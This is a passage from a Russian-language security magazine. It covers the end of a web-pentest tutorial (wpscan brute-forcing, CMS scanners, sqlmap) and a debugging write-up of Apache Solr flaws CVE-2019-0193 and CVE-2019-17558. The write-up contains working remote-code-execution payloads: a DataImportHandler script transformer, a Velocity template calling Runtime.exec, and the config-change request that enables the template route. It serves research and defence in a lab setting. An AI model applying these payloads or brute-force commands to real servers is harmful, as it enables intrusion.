 wpscan ‐‐url http://[IP‐address] ‐‐passwords pass.txt ‐‐usernames
 user.txt

 Брутфорсится  очень быстро  бла года ря мно гопо точности.  Если админ
 использовал стандартные учетные записи и установил несложные пароли, то
 результат не заставит себя долго ждать.





                    Найденные учетные дан ные

 Как видишь, учетные данные к админке и базе данных мы дос тали без осо‐
 бого труда. Для рядового взломщика это было бы больше чем предостаточ‐
 но, но мы еще не все проверили. На очереди — плагины для WP и дру гие
 популярные точки входа.
   Сканер показал нам, что на выбранном сайте нет ни одного установленно‐
 го плагина, однако это может быть ложным выводом, основанным на огра‐
 ничениях пассивного метода ска нирования. Для более надежного обнаруже‐
 ния плагинов нужно задать агрессивный метод их поис ка:


 wpscan ‐‐url http://[IP‐address] ‐‐enumerate ap ‐‐plugins‐detection
 aggressive

 Учти, что ключ ap покажет все найденные плагины, а vp — только уязвимые.
 Данная процедура занимает приличное время. Скорость будет зависеть
 от удаленности сайта, но даже в лучшем слу чае на это уйдет не мень‐
 ше 30 минут.
    Как  видишь,  агрессивный  метод  дал  свои  результаты:  обнаружен
 антиспам‐плагин Akismet версии 3.1.1.





                       Плагин Akismet v3.1.1

 Точно такими же действиями необходимо искать дру гие уязвимые допол‐
 нения к WP. Подробнее смот ри мануал в разделе ‐‐enumerate.
    Также посмотри идентифика торы известных уязвимостей — CVE. Нап‐
 ример, для версии PHP, на которой работа ет CMS. Затем поищи готовые мо‐
 дули Metasploit для WP и проверь их в деле.


                                      Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      HACK THE WEB!
          КАК ПРОВЕРИТЬ САЙТ НА УЯЗВИМОСТИ И КАК
                             ИХ ЭКСПЛУАТИРУЮТ





JOOMLA
Joomla тоже доволь но популярная CMS, для которой есть свой сканер —
JoomScan. Написали его ребята из Open Web Application Security Project
(OWASP). Он еще актуален, хотя и давно не обновлял ся. Последняя вер‐
сия 0.0.7 вышла в сентябре 2018 года.
  По своей сути это точно такой же ска нер безопасности, как и WPScan,
только немного попроще. JoomScan также предус тановлен в большинс тве
дистрибутивов для специалистов по безопасности, а весь его мануал уме‐
щается в несколько строк.





                             Help JoomScan

Он тоже поддерживает агрессивный метод ска ниро вания установленных ком‐
понентов. Команда запус ка ска ниро вания в агрессивном режиме выглядит
так:


joomscan ‐‐url http://84.42.34.2/ ‐‐enumerate‐components

Вот пример анализа найденной на просторах интернета старой и очень
дырявой версии сайта на Joomla.





                          JoomScan

Как видно по скриншоту, программа выдает версию CMS, CVE найденных
уязвимостей и ссылки на экс пло иты, которыми можно воспользоваться
для взлома сайта. Также в выводе приводятся все найденные на сайте дирек‐
тории и ссылка на файл конфигурации, если его забыли спрятать.
   Брутфорсить админку JoomScan не умеет. Сегодня, чтобы выпол нить
такой брутфорс, нужен серьезный инстру мент, который работает с цепочкой
прокси‐серверов. Хотя бы потому, что на сайтах с Joomla часто используется
плагин brute force stop. Когда количес тво неудачных попыток авторизации
достигает заданного чис ла, он блокиру ет IP‐адрес атакующего.
   Если сайт с Joomla работа ет на HTTP (что уже редкость), попробуй вос‐
пользоваться скриптом Nmap.


DRUPAL И ДРУГИЕ CMS
С Drupal все немного сложнее, как и с другими непопулярными CMS. Годного
сканера, который бы находил уяз вимос ти на таких сайтах, прос то  нет.
Из готовых инструментов мне уда лось найти лишь DroopeScan, но он только
помогает быстро соб рать базовую информа цию о жертве.
   Устанавливается DroopeScan через pip (естественно, у тебя дол жен быть
установлен Python).


pip install droopescan

Запускаем сканирование. Так как он поддержи вает не только Drupal, ему
желательно явно указать, какую CMS мы ожидаем встретить на сайте:


droopescan scan drupal ‐u http://url





                           DroopeScan

Остальное приходится выискивать руками и гуглить в интерне те. В этом очень
помогают сайты с поиском по базам уязвимостей, например CVEdetails,
и готовые эксплоиты с PoC (их можно найти на GitHub и в даркнете).
  К примеру, возьмем уязвимость CVE‐2018‐7600, которой подвержены вер‐
сии Drupal 7.х и 8.х. Она позволяет загрузить и выз вать shell удаленно. Экс‐
плоит для PoC можно взять тут.





                           Уяз вимый Drupal

Сканер выдал мне лишь версию CMS, и этого хва тило для эксплу атации уяз‐
вимости. В целом взлом Drupal и других CMS по своей сути ничем не отли‐
чается  от поиска дыр  в любом  дру гом онлайновом сервисе. Бреши
в безопасности либо есть, либо их еще не нашли.





                 PoC уяз вимости CVE‐2018‐7600

Не надо далеко ходить за боевым эксплоитом, чтобы открыть сессию в Meter‐
preter и воспользоваться уязвимостью в полной мере.


УДАР ПО САМОПИСНЫМ САЙТАМ
С тестированием самописных сайтов все намного сложнее. Нет конкретного
сканера, который сказал бы: вот тут есть старая версия веб‐приложения,
в нем известная дыра, вот ссылка на экспло ит и под робное описание его
применения. Есть только очень обширный список потенциальных уязвимос‐
тей, которые нужно проверить. Проводят такие пентесты по методике OWASP
или собственным алго ритмам.
   Тестирование на проникновение — дело сугубо творческое. В нем нет
жестких рамок и перечня обязательных инс трументов, особенно если они
опенсорсные. Однако аудит безопас ности — серьезная услуга, и некоторые
организации стараются структурировать ее выполнение, чтобы в полете фан‐
тазии пентестер ничего не пропустил.
  Одним из способов это сделать стало руководство OWASP Testing Guide
v4. Это подробный сборник пра вил обна ружения уяз вимос тей веб‐при ложе‐
ний. Ребята собрали и описали доступным языком методы тестирования уяз‐
вимостей десяти наиболее рас пространенных клас сов — OWASP 10.
   Если нужно проверить возможность взло ма самописного сайта, то лучше
начинать с того же WhatWeb. Только теперь мы смотрим не CMS, а все обна‐
руженные сервисы и их версии.
   Есть множество уязвимых версий самих фрей мворков. К примеру, зачас‐
тую используют устаревшие версии Ruby on Rails или Apache Tomcat. Экспло‐
иты для них есть в открытом доступе.
   Также стоит обратить внимание на версии самих языков программирова‐
ния. К примеру, в PHP пос тоянно находят уязвимости, а с момента их обна‐
ружения до апдейта на сайте может пройти не одна неделя.
  Следующим шагом желательно вос пользовать ся сканерами безопас‐
ности. Даже если они не дадут готовый вердикт, то подкинут пищу для раз‐
мышлений. Например, программа dirb поможет пробежаться по откры тым
директориям и вернет коды ответов.
  Для проверки на типовые уяз вимости воспользуйся универсальными ска‐
нерами: nikto, OWASP ZAP, w3af, skipﬁsh. Также советую иметь в запасе
mantra security toolkit.





                                     Nikto

Для всего остального есть Burp Suite. Обычно с его помощью выполняется
более сложный поиск уяз вимостей веб‐приложений. В качестве примера
рассмотрим поиск и эксплуата цию SQL‐инъекций.
   Ставим Burp Suite (в Kali Linux он уже предустановлен), находим в нем Re‐
peater (повторитель запросов) и запускаем. В запросе GET или POST ищем
передаваемое на сервер зна чение (типа id=12) и закидываем его в Repeater.





                     SQL‐инъекция в Repeater

Добавляем одинарную кавычку, чтобы про верить отсутствие фильтрации спе‐
циальных символов в передаваемом зна чении, и видим сообщение с ошиб‐
кой syntax error sql. Возникновение ошиб ки говорит о том, что сайт уяз‐
вим к SQL‐инъекциям. Для авто матизации развития атаки используем sqlmap.


sqlmap ‐u http://url/page.php?id=1 ‐‐dbs

Ключ ‐u указывает на URL цели, а ‐‐dbs говорит про верить все СУБД.





                             Sqlmap

Этот комбайн для SQL‐инъекций сам определит, какой пейлоад подходит,
и по твоим командам вытащит все нужные данные из баз на сайте. Он даже
предложит сразу определить пароли по хешам, если найдет. Особенно этот
софт полезен при эксплу атации так называемых слепых SQL‐инъ екций.


КАК ЗАЩИТИТЬСЯ
Если ты владелец сайта на CMS, то оптимальной стратегией безопас ности
будет отказаться от сомнитель ных дополнений, свести к миниму му чис ло пла‐
гинов и регулярно обновлять все программное обес печение. Веб‐дизай‐
нерам и программистам хочется напомнить элементарные правила написа‐
ния безопасного кода — хотя бы филь труйте спецзнаки в запросах к базам
данных и проверяйте позаимствованные в интернете скрипты.
   Если твой сайт писали на заказ, то нужно проверить все использованные
веб‐компоненты, удалить опциональные и сво евременно обновлять оставши‐
еся до актуальных версий. Поэто му заранее позаботь ся о поддержке сайта.
   Универсальный вариант — периоди чес ки заказывать поиск уязвимос тей
у стороннего специалиста. Кстати, круп ные компании часто платят воз‐
награждение за недочеты безопас ности, выявленные в их онлайновых сер‐
висах. Почему бы тебе не начать свою карьеру пентестера с bug bounty?


ЧТО ДАЛЬШЕ
Если тема поиска уязвимос тей в веб‐сервисах тебя заинтересовала, пред‐
лагаю самостоятельно попрактиковаться по руководству OWASP 10. А прежде
чем пентестить какие‐то реальные объекты, ты можешь отточить свои навыки
на специальных полигонах и уязвимых вир туальных машинах.


        WWW

                        •itsecgames.com — уяз вимая площадка bwapp
                         •hacksplaining.com — тестовый онлайн‐полигон
                         для практики
                        •vulnhub.com — огромный сборник  уязвимых
                        виртуальных машин
                         •pentesterlab.com  —  курсы  с  объяснением
                          веб‐уязвимостей
                    •Примеры веб‐уязвимостей
ВЗЛОМ
 СОЛНЕЧНЫЙ
       УДАР

                     РАЗБИРАЕМ ДВЕ
                        ОПАСНЫЕ
                      УЯЗВИМОСТИ
                     В APACHE SOLR





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity





Недавно исследова тели нашли две крупные уязвимости
в опенсорсной платформе полнотексто вого поиска Apache
Solr. Первый баг связан с некорректной обработкой шаб‐
лонов Velocity, второй кроется в модуле импорта баз данных.
Эксплуатация любого из них приводит к удален ному выпол‐
нению команд, поэто му их статус — критический.


Solr написан на Java и основан на поис ковом движке Apache Lucene. Его при‐
меняют для поиска по текстам, подсветки резуль татов, фасетного поиска,
динамической  кластеризации и прочего.  Solr хорошо масштабиру ется
и успел стать одним из самых популярных поисковых движков.
  Первая уязвимость — CVE‐2019‐17558. Она существует благодаря воз‐
можности перезаписи конфигура ции, что поз воляет использовать кастомные
шаблоны, в которых можно выполнять произволь ные системные команды. Баг
затрагивает все версии Apache Solr, начиная с 5.0.0 и заканчивая 8.3.1.
   Вторая уязвимость — CVE‐2019‐0193. Она находится в модуле DataIm‐
portHandler. Злоумышленник может передать полез ную нагрузку в параметре
dataConfig при помощи запроса GET к функции импорта конфигурации БД.
Обнаружил баг исследователь из Veracode Михаил Степанкин. Уяз вимость
затрагивает все версии Apache Solr до 8.2.0.


СТЕНД
Для начала поднимем стенд, на котором будем препарировать баги. Чтобы
сэкономить время, возьмем версию, которая уяз вима перед обоими экс пло‐
итами, — 8.1.1. Здесь, как обычно, два пути. Один — использовать готовый
контейнер  Docker,  он подойдет,  если  ты  не  планиру ешь  морочиться
с отладкой и копаться во внутренностях  Solr. Для этого воспользуемся
репозиторием vulhub. Все, что требуется, — это пара файлов docker‐com‐
pose.xml: для CVE‐2019‐0193 и для CVE‐2019‐17558. Сохраняем их в отдель‐
ные папки и запускаем с помощью команды


docker‐compose up ‐d





      Контейнер Docker для тестирова ния уяз вимос ти CVE‐2019‐0193

Теперь вернемся ко второму варианту стенда (я буду использовать в статье
именно его). На самом деле он не силь но слож нее. Сначала скачиваем
с официаль ного сайта необ ходимую версию Solr — solr‐8.1.1‐src.tgz. Рас‐
паковываем архив и переходим в директорию bin. Теперь, чтобы запустить
сервер, достаточно выполнить скрипт solr.cmd для Windows или solr
для Linux и macOS.


solr start

Сервер стартует на пор те 8983.





          Стенд Apache Solr 8.1.1 для тестирования уязвимостей

Однако нам еще понадобится воз можность отладки, поэтому пока притор‐
мозим Solr.


solr stop ‐all

Для дебага я буду использовать IntelliJ IDEA. Для начала вос пользуемся ути‐
литой Ant, чтобы сгенерировать необ ходимое окружение.


ant ivy‐bootstrap
ant idea

Переходим в папку solr и выполняем еще одну команду.


ant server





            Подготов ка окру жения для отладки Apache Solr

После того как команды успешно отработают, можно открывать проект
в IDEA. Теперь укажем параметры запуска сервера. Для этого добавим новую
конфигурацию удаленной отладки. Ука жем порт и выберем server в качестве
module classpath.





              Конфигура ция для уда лен ной отладки в IDEA

Обрати внимание на строку Command line arguments for remote JVM. Ее нужно
добавить в качестве аргумента в команду для запус ка сервера.


solr start ‐f ‐a "‐Xdebug ‐Xrunjdwp:transport=dt_socket,server=y,
suspend=y,address=8983"

После этого запускаем отладчик, и стенд готов.





           Готовый стенд Apache Solr с возможностью отладки

Осталось только создать два тес товых экземпляра ядра (core), чтобы ана‐
лизировать уязвимости. Для бага в DataImportHandler я буду использовать
конфиг example‐DIH.


solr create_core ‐c test ‐d ../example/example‐DIH/solr/db





             Тестовый экземпляр для ана лиза CVE‐2019‐0193

А для бага в обработчике шаблонов достаточно дефолтного конфига.


solr create_core ‐c vel

Переходим к обзору уязвимостей, начну в хронологическом порядке.


УЯЗВИМОСТЬ В DATAIMPORTHANDLER
Во многих поисковых приложениях контент для индексирования хранится
в структурированном хранилище данных, нап ример в реляционной СУБД.
Data Import Handler (или DIH) предоставляет механизм для импорта содер‐
жимого из такого хранилища данных и его индекса ции. В нем есть функция,
которая отправляет всю конфигура цию БД одним запросом с параметром
dataConfig. Режим дебага DIH позволяет удоб но отлаживать такую кон‐
фигурацию.
  Но есть и подводные камни — DIH‐конфигурация может содержать скрип‐
ты, а это потенциальный вектор для атаки. Точнее, это пря мой путь к выпол‐
нению произвольного кода! :) Если заглянешь в документацию к ScriptTransfer,
то увидишь,  что, хотя функции‐трансформаторы и пишутся по дефол ту
на JavaScript, в них можно использовать вставки кода на Java.





        Пример использования ScriptTransformer с кодом на Java

Также обрати внимание на то, как вызывается соз данный трансформер.
  Используя тривиальный метод getRuntime().exec(), можно накидать
тело функции rce, которая будет выполнять любой код.


<dataConfig>
  <script><![CDATA[
    function rce() {
      java.lang.Runtime.getRuntime().exec("calc");
    }
  ]]></script>

Остается вопрос о том, в каком контексте эту функцию можно вызвать.
Для этих целей нам понадо бит ся источник валидных данных. Так как возиться
с поднятием своей БД совсем не хочет ся, заглянем еще раз в документацию.
К нашему счастью, DataImportHandler поддерживает целую вязанку разных
источников. Например, URLDataSource, который получает данные из оп‐
ределенного URL.


<dataConfig>
  <dataSource type="URLDataSource" />
  <script><![CDATA[
    function rce() {
      java.lang.Runtime.getRuntime().exec("calc");
    }
  ]]></script>

В качестве обработчика данных я буду использовать обычный PlainTextEnti‐
tyProcessor, который просто читает все содержимое в поле plainText.
Но это абсолют но не важ но, главное — использовать в качестве трансфор‐
мера нашу функцию.


<dataConfig>
  <dataSource type="URLDataSource" />
  <script><![CDATA[
    function rce() {
      java.lang.Runtime.getRuntime().exec("calc");
    }
  ]]></script>
  <document>
    <entity processor="PlainTextEntityProcessor" name="x" url=
"http://abc.com/" transformer="script:rce" />
  </document>
</dataConfig>

Здесь я получаю все содержимое страницы http://abc.com/ и затем при‐
меняю к нему функцию rce.
  Вклю чим режим отладки конфигурации DIH и отправим полученный пей‐
лоад. Если сейчас перехватить запрос, то он будет передан в параметре dat‐
aConfig.





  Выполнение произволь ного кода в Apache Solr через DataImportHandler

Установим в отладчике брейк‐пойнт на вызов метода инициализации Script‐
Transformer.


org.apache.solr.handler.dataimport.ScriptTransformer#initEngine

И видим, что по умол чанию для трансформеров используется JavaScript.
А движок, который выполняет парсинг кода на JS, — Nashorn.





              Отладка инициализации ScriptTransformer


/solr-
8.1.1/solr/contrib/dataimporthandler/src/java/org/apache/solr/han-
dler/dataimport/ScriptTransformer.java
44: public class ScriptTransformer extends Transformer {
...
65:   private void initEngine(Context context) {
66:     String scriptText = context.getScript();
67:     String scriptLang = context.getScriptLanguage();
...
72:     ScriptEngineManager scriptEngineMgr = new ScriptEngineManager
();
73:     ScriptEngine scriptEngine = scriptEngineMgr.getEngineByName(
scriptLang);
...
86:     try {
87:       scriptEngine.eval(scriptText);

Из документации можно узнать, что Nashorn поз воляет обращаться к стан‐
дартным пакетам и классам Java.





    Вызов калькулятора через java.lang.Runtime.getRuntime в Nashorn

Далее выполнение кода перехо дит в


org.apache.solr.handler.dataimport.ScriptTransformer#transformRow

Здесь и вызывается наша функция.


/solr-
8.1.1/solr/contrib/dataimporthandler/src/java/org/apache/solr/han-
dler/dataimport/ScriptTransformer.java
44: public class ScriptTransformer extends Transformer {
...
48:   @Override
49:   public Object transformRow(Map<String, Object> row, Context
context) {
50:     try {
51:       if (engine == null)
52:         initEngine(context);
53:       if (engine == null)
54:         return row;
55:       return engine.invokeFunction(functionName, new Object[]{row
, context});





                Момент вызова функции rce

Таким образом, можно выполнить любые команды в системе. Это поведение,
разумеется, открывает серьезную брешь в безопасности, поэтому с вер‐
сии 8.2.0 Apache Solr по дефолту не позволяет использовать загрузку нап‐
рямую через веб‐интерфейс из парамет ра dataConfig. Чтобы такой способ
заработал, теперь нужно установить настройку enable.dih.dataConfig‐
Param в true.


УЯЗВИМОСТЬ В ДВИЖКЕ VELOCITY
Начнем с того, что для успешной эксплуата ции понадобится доступ к API
админа. Это нужно, что бы изменить конфигурацию уже созданного ядра
и включить параметр params.resource.loader.enabled в VelocityRespon‐
seWriter. Это  позволит передавать шаб лоны  в  параметрах  запроса.
По дефолту эта опция отклю чена.


/solr-8.1.1/solr/server/solr/vel/conf/solrconfig.xml
1293: <!‐‐
1294:    Custom response writers can be declared as needed...
1295:   ‐‐>
1296: <queryResponseWriter name="velocity" class="solr.Veloci
tyResponseWriter" startup="lazy">
1297:   <str name="template.base.dir">${velocity.template.base.dir:}
</str>
1298:   <str name="solr.resource.loader.enabled">${velocity.solr.
resource.loader.enabled:true}</str>
1299:   <str name="params.resource.loader.enabled">${velocity.params.
resource.loader.enabled:false}</str>
1300: </queryResponseWriter>





              Параметр params.resource.loader.enabled

Сначала получим список всех инстансов с помощью такого запроса к API.


http://solr.vh:8983/solr/admin/cores?indexInfo=false&wt=json

Это пригодится в боевых усло виях.





           Получение списка ядер в Apache Solr через API



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   СОЛНЕЧНЫЙ УДАР
            РАЗБИРАЕМ ДВЕ ОПАСНЫЕ УЯЗВИМОСТИ
                              В APACHE SOLR




Нас интересует ядро vel, которое я соз дал специально для тес тирования.
Далее заглянем в файл конфигурации веб‐сервера web.xml.


/solr-8.1.1/solr/webapp/web/WEB-INF/web.xml
25: <!‐‐ Any path (name) registered in solrconfig.xml will be sent
to that filter ‐‐>
26: <filter>
27:   <filter‐name>SolrRequestFilter</filter‐name>
28:   <filter‐class>org.apache.solr.servlet.SolrDispatchFilter</
filter‐class>
...
40: <filter‐mapping>
41:   <filter‐name>SolrRequestFilter</filter‐name>
42:   <url‐pattern>/*</url‐pattern>
43: </filter‐mapping>

Все запросы, отправленные на сервер, про ходят через фильтр SolrRequest‐
Filter, который объявлен классом org.apache.solr.servlet.SolrDis‐
patchFilter. Обратимся к ма нуалу по Conﬁg API. Нам нужно отправить зап‐
рос на <имя_ядра>/config, чтобы поменять его настройки. У каждого
эндпойнта API есть свои обработчики. Очередное об ращение в докумен‐
тацию расскажет нам, что за URI <имя_ядра>/config стоит SolrConﬁgHandler.
Заглянем в тело это го класса. Метод handleRequestBody обрабаты вает
отправленный запрос.


/solr-
8.1.1/solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.-
java
101: public class SolrConfigHandler extends RequestHandlerBase implem
ents SolrCoreAware, PermissionNameProvider {
...
124:   @Override
125:   public void handleRequestBody(SolrQueryRequest req, SolrQu
eryResponse rsp) throws Exception {
126:
127:     RequestHandlerUtils.setWt(req, CommonParams.JSON);
128:     String httpMethod = (String) req.getContext().get("httpMe
thod");
129:     Command command = new Command(req, rsp, httpMethod);
...
141:       command.handleGET();

Если мы делаем обычный запрос GET к этому эндпойнту, то вызывается han‐
dleGET и возвращается текущая конфигура ция ядра. Так, нужная нам опция
params.resource.loader.option.enabled сейчас установлена в false.


/solr-
8.1.1/solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.-
java
158: private class Command {
...
179:   private void handleGET() {
180:     if (parts.size() == 1) {
181:       // This is the whole config. Sent out the whole payload
182:       resp.add("config", getConfigDetails(null, req));
...
258:   private Map<String, Object> getConfigDetails(String compon
entType, SolrQueryRequest req) {
259:     String componentName = componentType == null ? null : req.
getParams().get("componentName");
260:     boolean showParams = req.getParams().getBool("expandParams",
 false);
261:     Map<String, Object> map = this.req.getCore().getSolrConfig()
.toMap(new LinkedHashMap<>());
262:     if (componentType != null && !SolrRequestHandler.TYPE.equals
(componentType)) return map;
263:     Map reqHandlers = (Map) map.get(SolrRequestHandler.TYPE);
264:     if (reqHandlers == null) map.put(SolrRequestHandler.TYPE,
reqHandlers = new LinkedHashMap<>());
265:     List<PluginInfo> plugins = this.req.getCore().getImp
licitHandlers();
266:     for (PluginInfo plugin : plugins) {
267:       if (SolrRequestHandler.TYPE.equals(plugin.type)) {
...
269:           reqHandlers.put(plugin.name, plugin);
...
273:     if (!showParams) return map;





              Отладка GET‐запроса на эндпойнт /conﬁg

В окне браузера ты можешь наблюдать ответ от сервера в формате JSON.





          Текущая конфигура ция queryResponseWriter в ядре vel

Нам нужно изменить существу ющую конфигура цию, это делается POST‐зап‐
росом и обрабатывается методом handlePOST. Поставим бряк на его вызов
и отправим запрос на изменение конфигура ции движка Velocity.


POST /solr/vel/config HTTP/1.1
Host: solr.vh:8983
Content‐Type: application/json
Content‐Length: 0


{
  "update‐queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}


/solr-
8.1.1/solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.-
java
124: @Override
125: public void handleRequestBody(SolrQueryRequest req, SolrQu
eryResponse rsp) throws Exception {
...
128:   String httpMethod = (String) req.getContext().get("httpMethod"
);
129:   Command command = new Command(req, rsp, httpMethod);
...
135:     try {
136:       command.handlePOST();

Solr обрабатывает тело запроса и выбира ет из него переданные команды.
У нас она только одна — update‐queryresponsewriter.


/solr-
8.1.1/solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.-
java
332: private void handlePOST() throws IOException {
333:   List<CommandOperation> ops = CommandOperation.readCommands(req
.getContentStreams(), resp.getValues());
...
344:           ConfigOverlay overlay = SolrConfig.getConfigOverlay(
req.getCore().getResourceLoader());
345:           handleCommands(opsCopy, overlay);





             Отладка Apache Solr. Вызов handleCommands

Затем в дело вступает метод handleCommands. Он разбивает переданную
строку по символу «минус» и получает имя команды и имя модуля (плагина),
к которому эту команду нужно применить.


/solr-
8.1.1/solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.-
java
453: private void handleCommands(List<CommandOperation> ops, Config
Overlay overlay) throws IOException {
454:   for (CommandOperation op : ops) {
455:     switch (op.name) {
...
468:       default: {
469:         List<String> pcs = StrUtils.splitSmart(op.name.toLowe
rCase(Locale.ROOT), '‐');
...
473:           String prefix = pcs.get(0);
474:           String name = pcs.get(1);
475:           if (cmdPrefixes.contains(prefix) && namedPlugins.
containsKey(name)) {
476:             SolrConfig.SolrPluginInfo info = namedPlugins.get(
name);





            Проверка типа переданной команды и модуля

Если такой модуль найден, то обновляем его конфигурацию данными,
которые переданы в запросе. Эту операцию выполняет updateNamedPlugin.


/solr-
8.1.1/solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.-
java
480:               overlay = updateNamedPlugin(info, op, overlay,
prefix.equals("create") || prefix.equals("add"));
...
522: private ConfigOverlay updateNamedPlugin(SolrConfig.SolrPl
uginInfo info, CommandOperation op, ConfigOverlay overlay, boolean
isCeate) {
523:   String name = op.getStr(NAME);
524:   String clz = info.options.contains(REQUIRE_CLASS) ? op.getStr(
CLASS_NAME) : op.getStr(CLASS_NAME, null);
525:   op.getMap(DEFAULTS, null);
526:   op.getMap(PluginInfo.INVARIANTS, null);
527:   op.getMap(PluginInfo.APPENDS, null);
528:   if (op.hasError()) return overlay;
529:   if (!verifyClass(op, clz, info.clazz)) return overlay;
530:   if (pluginExists(info, overlay, name)) {
...
535:       return overlay.addNamedPlugin(op.getDataMap(), info.getCle
anTag());

После того как все опции проверены, Solr записывает обновленную кон‐
фигурацию, и управление переходит к методу persistConfLocally.


/solr-
8.1.1/solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.-
java
494: SolrResourceLoader loader = req.getCore().getResourceLoader();
...
504:   SolrResourceLoader.persistConfLocally(loader, ConfigOverlay.
RESOURCE_NAME, overlay.toByteArray());

Но он не перезаписывает существующий конфигурационный файл, а создает
новый configoverlay.json. Это надстройка над существующей конфигура‐
цией: сначала читается основной конфиг, а затем configoverlay.json. Бла‐
годаря такой последовательной загрузке переопределяются только настрой‐
ки для некоторых модулей.


/solr-
8.1.1/solr/core/src/java/org/apache/solr/core/SolrResourceLoader.-
java
888: public static void persistConfLocally(SolrResourceLoader loader,
 String resourceName, byte[] content) {
889:   // Persist locally
890:   File confFile = new File(loader.getConfigDir(), resourceName);
891:   try {
892:     File parentDir = confFile.getParentFile();
...
900:     try (OutputStream out = new FileOutputStream(confFile);) {
901:       out.write(content);





  Сохранение обновлен ной конфигура ции queryResponseWriter в файл
  conﬁgoverlay.json

Теперь благодаря обновлен ной конфигурации опция params.resource.
loader.enabled установлена в true.





        Добавочный конфигура ционный файл conﬁgoverlay.json

Перед тем как переходить к эксплуата ции, немного отвлечемся и поговорим
об особенностях Java и шаб лонах Velocity.
   Как и большинство приложений на Java, Solr использует трехуровневую
архитектуру (3‐tier) приложения: уровень представления (Presentation Layer),
уровень бизнес‐логики (Business Layer) и уровень интерфейса данных (Data
Layer). Каждый слой дос тупен независимо, имеет высокую автономность
и построен из своих компонентов. Например, два наиболее используемых
фреймворка в Java — это Struts2 и Spring MVC. Они поз воляют реализовать
не только классическую модель раз деления Model — View — Controller (MVC),
но и другие, более гибкие концепции.
  В контексте этой уязвимос ти нас интересу ет толь ко слой представления,
который обслуживается раз личными шаблонными движками. Один из них —
Velocity. По срав нению с обычными статичес кими страницами на HTML в шаб‐
лонах есть возможность использовать простой язык для обращения к объ‐
ектам, определенным в коде на Java. Это упрощает раз работку более прод‐
винутых интерфейсов. Кроме того, при веб‐разработке Velocity дает UX‐
дизайнерам и разработ чикам бизнес‐логики писать код независимо друг
от друга — в том чис ле и параллельно.  Velocity отделяет код на Java
от веб‐страницы, что потом облегчает обслуживание сайта.
   Теперь к практике. Создадим простой шаблон Velocity.


helloworld.vm
Hello ${name}!  Welcome to Velocity!

И код к нему.


HelloWorld.java
import java.io.StringWriter;
import org.apache.velocity.app.VelocityEngine;
import org.apache.velocity.Template;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.runtime.RuntimeConstants;
import org.apache.velocity.runtime.resource.loader.ClasspathResour
ceLoader;


public class HelloWorld {
  public static void main( String[] args ) throws Exception {
    /*  Инициализируем движок  */
    VelocityEngine ve = new VelocityEngine();
    ve.setProperty(RuntimeConstants.RESOURCE_LOADER, "classpath");
    ve.setProperty("classpath.resource.loader.class", ClasspathResour
ceLoader.class.getName());
    ve.init();
    /*  Получаем тело шаблона  */
    Template t = ve.getTemplate( "helloworld.vm" );
    /*  Создаем контекст и объявляем переменные */
    VelocityContext context = new VelocityContext();
    context.put("name", "WORLD");
    /* Выполняем рендеринг в StringWriter */
    StringWriter writer = new StringWriter();
    t.merge( context, writer );
    /* Выводим в консоль */
    System.out.println( writer.toString() );
  }
}

После исполнения это го файла в консоли отобразится строчка «Hello WORLD!
Welcome  to  Velocity!». То есть через код было передано содержимое
в переменную name в шаблоне.





              Рендеринг простого шаблона Velocity в Java

Можно не только переда вать переменные в коде, но и инициализировать их
прямо в шаблоне.


helloworld.vm
#set($var="VARIABLE")
Hello ${name}!  Welcome to Velocity!
It's ${var} from template.





          Пе ременная, объявленная внут ри шаблона Velocity

И даже классы можно свободно вызывать, исполь зуя небольшой трюк. Нап‐
ример, запустим уже набивший оскомину калькулятор.


helloworld.vm
#set($t="any")
#set($rnt=$t.class.forName("java.lang.Runtime"))
#set($ex=$rnt.getRuntime().exec('calc'))
$ex.waitFor()





        Выполнение произволь ного кода через шаблон Velocity

Вот теперь у нас все готово. Нужно только выз вать этот шаблон через Solr.
Для этого будем исполь зовать запрос select.


http://solr.vh:8983/solr/vel/select?q=any

По дефолту результат воз вра щается в виде JSON. Это можно изменить,
передав в параметре wt необ ходимый тип форматирования отве та на запрос
(response writer). Укажем здесь velocity.


http://solr.vh:8983/solr/vel/select?q=any&wt=velocity


/solr-
8.1.1/solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java
135: public class HttpSolrCall {
...
785:   protected QueryResponseWriter getResponseWriter() {
786:     String wt = solrReq.getParams().get(CommonParams.WT);
787:     if (core != null) {
788:       return core.getQueryResponseWriter(wt);
789:     } else {
790:       return SolrCore.DEFAULT_RESPONSE_WRITERS.getOrDefault(wt,
791:           SolrCore.DEFAULT_RESPONSE_WRITERS.get("standard"));
792:     }
793:   }





          Получение response writer из запроса к Apache Solr

У нас нет шаблона /select.vm, поэто му сервер и возвращает ошибку.





         Различные варианты ответа от сервера на запрос select




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   СОЛНЕЧНЫЙ УДАР
            РАЗБИРАЕМ ДВЕ ОПАСНЫЕ УЯЗВИМОСТИ
                              В APACHE SOLR




Но он нам и не нужен, так как мы вклю чили воз можность передавать шаблон
прямо в теле запроса. Вернемся к обработчику запросов — SolrDispatch‐
Filter.


/solr-
8.1.1/solr/core/src/java/org/apache/solr/servlet/SolrDispatchFilter.-
java
092: public class SolrDispatchFilter extends BaseSolrFilter {
...
342:   public void doFilter(ServletRequest request, ServletResponse
response, FilterChain chain) throws IOException, ServletException {
343:     doFilter(request, response, chain, false);
...
346:   public void doFilter(ServletRequest _request, ServletResponse
_response, FilterChain chain, boolean retry) throws IOException,
ServletException {
347:     if (!(_request instanceof HttpServletRequest)) return;
348:     HttpServletRequest request = closeShield((HttpServletRequest
)_request, retry);
349:     HttpServletResponse response = closeShield((HttpServletResp
onse)_response, retry);
...
394:       HttpSolrCall call = getHttpSolrCall(request, response,
retry);
395:       ExecutorUtil.setServerThreadFlag(Boolean.TRUE);
396:       try {
